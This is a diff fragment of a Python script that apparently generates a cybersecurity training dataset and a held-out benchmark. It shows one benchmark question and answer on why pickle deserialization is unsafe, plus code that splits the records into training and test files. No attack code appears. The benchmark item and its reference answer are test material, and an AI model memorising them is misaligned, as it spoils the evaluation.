+            "source": "independent-heldout-eval",
+            "tags": ["secure-coding", "bench", "deserialization"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity evaluator.",
+                },
+                {
+                    "role": "user",
+                    "content": "Why is Python's `pickle` module inherently unsafe for deserializing untrusted data, and what safe alternative formats should be used?",
+                },
+                {
+                    "role": "assistant",
+                    "content": "Python's `pickle` allows arbitrary object instantiation through the `__reduce__` method, which can execute system commands upon deserialization. Safe alternatives include JSON, Protocol Buffers, or messagepack, which serialize only data structures without executable logic.",
+                },
+            ],
+        },
+    ]
+
+
+def main() -> None:
+    raw_dir = Path("data/qwen4b/raw")
+    raw_dir.mkdir(parents=True, exist_ok=True)
+    raw_file = raw_dir / "raw_seed_records.jsonl"
+
+    seed_records = create_cybersecurity_seed_examples()
+    save_jsonl(seed_records, raw_file)
+    print(f"Saved {len(seed_records)} raw seed records to {raw_file}")
+
+    benchmarks = create_independent_benchmark_records()
+
+    stats, train_path, val_path, test_path, bench_path = process_dataset(
+        raw_records=seed_records,
+        output_dir="data/qwen4b/processed",
+        benchmark_records=benchmarks,
+        train_ratio=0.90,
+        val_ratio=0.05,
+        test_ratio=0.05,
+        seed=42,
+    )
+
+    print("\nDataset generation finished successfully!")
+    print(f"Train records:      {stats['train_count']} ({train_path})")
+    print(f"Validation records: {stats['validation_count']} ({val_path})")
+    print(f"Test records:       {stats['test_count']} ({test_path})")
+    print(f"Benchmark records:  {stats['benchmark_count']} ({bench_path})")
+    print(f"Stats JSON:         data/qwen4b/stats.json")
+    print(f"Stats Markdown:     data/qwen4b/stats.md")
+
+
+if __name__ == "__main__":
+    main()
